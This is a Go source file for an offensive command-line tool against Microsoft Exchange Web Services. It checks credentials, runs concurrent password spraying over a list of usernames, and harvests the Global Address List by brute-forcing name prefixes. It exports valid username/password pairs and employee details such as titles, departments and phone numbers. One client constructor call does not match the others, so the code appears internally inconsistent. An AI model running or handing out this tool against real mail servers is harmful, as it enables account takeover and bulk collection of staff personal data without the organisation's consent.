package main

import (
	"bufio"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"ews_enum/internal/ews"
)

func main() {
	url := flag.String("url", "", "EWS endpoint URL (e.g. https://mail.target.com/EWS/Exchange.asmx)")
	user := flag.String("user", "", "Username (DOMAIN\\user or user@domain.com)")
	userfile := flag.String("userfile", "", "File of usernames for password spraying (one per line)")
	pass := flag.String("pass", "", "Password")
	enumGAL := flag.Bool("enum", false, "Enumerate the Global Address List after authenticating")
	format := flag.String("format", "csv", "Output format: csv, json, emails (enum) or csv, json (spray)")
	outfile := flag.String("o", "", "Output file (default: stdout)")
	ntlm := flag.Bool("ntlm", true, "Use NTLM authentication (default true, set -ntlm=false for basic)")
	timeout := flag.Int("timeout", 30, "HTTP timeout in seconds")
	depth := flag.Int("depth", 3, "Max prefix depth for enumeration (2=aa, 3=aaa)")
	delay := flag.Int("delay", 0, "Delay in milliseconds between requests")
	workers := flag.Int("workers", 10, "Number of concurrent workers")
	conns := flag.Int("conns", 20, "Max concurrent connections to server")
	flag.Parse()

	if *url == "" || *pass == "" {
		fmt.Fprintf(os.Stderr, "Usage: ews_enum -url <EWS_URL> (-user <USER> | -userfile <FILE>) -pass <PASS> [options]\n\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *user != "" && *userfile != "" {
		fmt.Fprintf(os.Stderr, "[!] Cannot use both -user and -userfile\n")
		os.Exit(1)
	}

	if *user == "" && *userfile == "" {
		fmt.Fprintf(os.Stderr, "[!] Must specify either -user or -userfile\n")
		os.Exit(1)
	}

	if *userfile != "" {
		runSpray(*url, *userfile, *pass, *format, *outfile, *ntlm, *timeout, *delay, *workers, *conns)
	} else if *enumGAL {
		runEnum(*url, *user, *pass, *format, *outfile, *ntlm, *timeout, *depth, *delay, *workers, *conns)
	} else {
		runAuthCheck(*url, *user, *pass, *ntlm, *timeout, *conns)
	}
}

// --- Auth Check Mode ---

func runAuthCheck(url, user, pass string, ntlm bool, timeout, conns int) {
	client := ews.NewClient(ews.ClientOpts{
		NTLM: ntlm, TimeoutSec: timeout, MaxConns: conns, UseCookies: true,
	})

	fmt.Fprintf(os.Stderr, "[*] Testing credentials against %s\n", url)
	fmt.Fprintf(os.Stderr, "[*] User: %s\n", user)

	result, err := ews.TestAuth(client, url, user, pass)

	switch result {
	case ews.AuthSuccess:
		fmt.Fprintf(os.Stderr, "[+] VALID credentials: %s\n", user)
	case ews.AuthFailed:
		fmt.Fprintf(os.Stderr, "[-] INVALID credentials: %s\n", user)
		os.Exit(1)
	case ews.AuthError:
		fmt.Fprintf(os.Stderr, "[!] ERROR: %v\n", err)
		os.Exit(2)
	}
}

// --- Password Spray Mode ---

func runSpray(url, userfile, pass, format, outfile string, ntlm bool, timeout, delay, workers, conns int) {
	users, err := readLines(userfile)
	if err != nil {
		log.Fatalf("Cannot read userfile: %v", err)
	}
	if len(users) == 0 {
		fmt.Fprintf(os.Stderr, "[!] No usernames found in %s\n", userfile)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "[*] Password spray against %s\n", url)
	fmt.Fprintf(os.Stderr, "[*] Users: %d, workers: %d, connections: %d\n", len(users), workers, conns)

	type sprayResult struct {
		User   string `json:"user"`
		Status string `json:"status"`
	}

	var mu sync.Mutex
	var validUsers []string
	var attemptCount atomic.Int64
	totalUsers := int64(len(users))

	workCh := make(chan string, workers*2)
	var wg sync.WaitGroup

	clearProgress := func() {
		fmt.Fprintf(os.Stderr, "\r%-100s\r", "")
	}

	client := ews.NewClient(ews.ClientOpts{
		NTLM: ntlm, TimeoutSec: timeout, MaxConns: conns,
		DisableKeepAlive: ntlm, // NTLM binds auth to TCP connection; must not reuse across users
	})

	// Worker
	sprayWorker := func() {
		defer wg.Done()
		for username := range workCh {
			if delay > 0 {
				time.Sleep(time.Duration(delay) * time.Millisecond)
			}

			count := attemptCount.Add(1)
			mu.Lock()
			hits := len(validUsers)
			mu.Unlock()
			fmt.Fprintf(os.Stderr, "\r[*] [%d/%d] Trying: %-40s (valid: %d)", count, totalUsers, username, hits)

			result, authErr := ews.TestAuth(client, url, username, pass)

			switch result {
			case ews.AuthSuccess:
				mu.Lock()
				validUsers = append(validUsers, username)
				clearProgress()
				fmt.Fprintf(os.Stderr, "[+] VALID: %s\n", username)
				mu.Unlock()

			case ews.AuthFailed:
				// silent — just move on

			case ews.AuthError:
				mu.Lock()
				clearProgress()
				fmt.Fprintf(os.Stderr, "[!] ERROR: %s — %v\n", username, authErr)
				mu.Unlock()
			}
		}
	}

	// Start workers
	wg.Add(workers)
	for i := 0; i < workers; i++ {
		go sprayWorker()
	}

	// Feed users
	for _, u := range users {
		workCh <- u
	}
	close(workCh)

	wg.Wait()

	clearProgress()
	fmt.Fprintf(os.Stderr, "[*] Spray complete: %d/%d valid credentials\n", len(validUsers), len(users))

	if len(validUsers) == 0 {
		return
	}

	// Output valid users
	out := os.Stdout
	if outfile != "" {
		f, err := os.Create(outfile)
		if err != nil {
			log.Fatalf("Cannot create output file: %v", err)
		}
		defer f.Close()
		out = f
	}

	sort.Strings(validUsers)

	switch format {
	case "json":
		results := make([]sprayResult, len(validUsers))
		for i, u := range validUsers {
			results[i] = sprayResult{User: u, Status: "valid"}
		}
		enc := json.NewEncoder(out)
		enc.SetIndent("", "  ")
		if err := enc.Encode(results); err != nil {
			log.Fatalf("JSON encode: %v", err)
		}

	default: // csv or anything else
		w := csv.NewWriter(out)
		w.Write([]string{"username", "password", "status"})
		for _, u := range validUsers {
			w.Write([]string{u, pass, "valid"})
		}
		w.Flush()
		if err := w.Error(); err != nil {
			log.Fatalf("CSV write: %v", err)
		}
	}

	if outfile != "" {
		fmt.Fprintf(os.Stderr, "[*] Results written to %s\n", outfile)
	}
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

// --- GAL Enumeration Mode ---

type enumWork struct {
	prefix string
	depth  int
}

func runEnum(url, user, pass, format, outfile string, ntlm bool, timeout, depth, delay, workers, conns int) {
	client := ews.NewClient(ntlm, timeout, conns, true)

	var mu sync.Mutex
	seen := make(map[string]ews.Contact)
	var requestCount atomic.Int64
	chars := "abcdefghijklmnopqrstuvwxyz"
	topLevelPrefixes := chars + "0123456789"
	var topLevelDone atomic.Int64
	totalTopLevel := int64(len(topLevelPrefixes))

	workCh := make(chan enumWork, 10000)
	var pending atomic.Int64
	doneCh := make(chan struct{}, 1)
	abortCh := make(chan struct{})
	var abortOnce sync.Once
	var workerWg sync.WaitGroup
	var anySuccess atomic.Bool
	var authErrors atomic.Int64
	authAbortThreshold := int64(workers)
	if totalTopLevel < authAbortThreshold {
		authAbortThreshold = totalTopLevel
	}

	clearProgress := func() {
		fmt.Fprintf(os.Stderr, "\r%-100s\r", "")
	}

	printStatus := func(prefix string) {
		mu.Lock()
		found := len(seen)
		mu.Unlock()
		reqs := requestCount.Load()
		top := topLevelDone.Load()
		fmt.Fprintf(os.Stderr, "\r[*] [%d/%d] Resolving prefix: %-6s (found: %d, requests: %d, workers: %d)", top, totalTopLevel, prefix, found, reqs, workers)
	}

	enqueue := func(w enumWork) {
		pending.Add(1)
		select {
		case workCh <- w:
		case <-abortCh:
			pending.Add(-1)
		}
	}

	finishItem := func() {
		if pending.Add(-1) == 0 {
			select {
			case doneCh <- struct{}{}:
			default:
			}
		}
	}

	worker := func() {
		defer workerWg.Done()
		for {
			select {
			case <-abortCh:
				return
			case item, ok := <-workCh:
				if !ok {
					return
				}

				if delay > 0 {
					time.Sleep(time.Duration(delay) * time.Millisecond)
				}

				requestCount.Add(1)
				if item.depth == 1 {
					topLevelDone.Add(1)
				}
				printStatus(item.prefix)

				contacts, truncated, err := ews.ResolveNames(client, url, user, pass, item.prefix)
				if err != nil {
					mu.Lock()
					clearProgress()
					fmt.Fprintf(os.Stderr, "[!] Error on prefix %q: %v\n", item.prefix, err)
					mu.Unlock()

					errStr := err.Error()
					if strings.Contains(errStr, "authentication failed") ||
						strings.Contains(errStr, "LogonDenied") ||
						strings.Contains(errStr, "AccessDenied") {
						count := authErrors.Add(1)
						// Only abort if no request has ever succeeded
						// (load-balanced Exchange may reject some requests)
						if !anySuccess.Load() && count >= authAbortThreshold {
							fmt.Fprintf(os.Stderr, "[!] All requests failing auth — aborting. Check your credentials and auth method.\n")
							abortOnce.Do(func() { close(abortCh) })
							finishItem()
							return
						}
					}
					finishItem()
					continue
				}

				anySuccess.Store(true)

				mu.Lock()
				for _, c := range contacts {
					key := strings.ToLower(c.EmailAddress)
					if key == "" {
						key = strings.ToLower(c.DisplayName)
					}
					if _, exists := seen[key]; !exists {
						seen[key] = c
						clearProgress()
						printContact(c)
					}
				}
				mu.Unlock()

				if truncated && item.depth < depth {
					for _, ch := range chars {
						enqueue(enumWork{prefix: item.prefix + string(ch), depth: item.depth + 1})
					}
				}

				finishItem()
			}
		}
	}

	fmt.Fprintf(os.Stderr, "[*] Starting GAL enumeration against %s\n", url)
	fmt.Fprintf(os.Stderr, "[*] Max prefix depth: %d, workers: %d, connections: %d\n", depth, workers, conns)

	workerWg.Add(workers)
	for i := 0; i < workers; i++ {
		go worker()
	}

	for _, ch := range topLevelPrefixes {
		select {
		case <-abortCh:
			goto shutdown
		default:
		}
		enqueue(enumWork{prefix: string(ch), depth: 1})
	}

	select {
	case <-doneCh:
	case <-abortCh:
	}

shutdown:
	// Signal abort so workers stop reading from workCh
	abortOnce.Do(func() { close(abortCh) })
	// Wait for workers to exit before closing workCh
	workerWg.Wait()
	// Drain any remaining items
	close(workCh)
	for range workCh {
	}

	clearProgress()
	fmt.Fprintf(os.Stderr, "[*] Enumeration complete: %d unique entries, %d requests\n", len(seen), requestCount.Load())

	results := make([]ews.Contact, 0, len(seen))
	for _, c := range seen {
		results = append(results, c)
	}
	sort.Slice(results, func(i, j int) bool {
		return strings.ToLower(results[i].EmailAddress) < strings.ToLower(results[j].EmailAddress)
	})

	out := os.Stdout
	if outfile != "" {
		f, err := os.Create(outfile)
		if err != nil {
			log.Fatalf("Cannot create output file: %v", err)
		}
		defer f.Close()
		out = f
	}

	switch format {
	case "json":
		enc := json.NewEncoder(out)
		enc.SetIndent("", "  ")
		if err := enc.Encode(results); err != nil {
			log.Fatalf("JSON encode: %v", err)
		}

	case "emails":
		for _, c := range results {
			if c.EmailAddress != "" {
				fmt.Fprintln(out, c.EmailAddress)
			}
		}

	default: // csv
		w := csv.NewWriter(out)
		w.Write([]string{"email", "display_name", "given_name", "surname", "title", "department", "office", "company", "phone"})
		for _, c := range results {
			w.Write([]string{
				c.EmailAddress,
				c.DisplayName,
				c.GivenName,
				c.Surname,
				c.Title,
				c.Department,
				c.Office,
				c.Company,
				c.Phone,
			})
		}
		w.Flush()
		if err := w.Error(); err != nil {
			log.Fatalf("CSV write: %v", err)
		}
	}

	if outfile != "" {
		fmt.Fprintf(os.Stderr, "[*] Results written to %s\n", outfile)
	}
}

func printContact(c ews.Contact) {
	parts := []string{}
	if c.EmailAddress != "" {
		parts = append(parts, c.EmailAddress)
	}
	if c.DisplayName != "" {
		parts = append(parts, c.DisplayName)
	}
	if c.Title != "" {
		parts = append(parts, c.Title)
	}
	if c.Department != "" {
		parts = append(parts, c.Department)
	}
	fmt.Fprintf(os.Stderr, "[+] %s\n", strings.Join(parts, " | "))
}
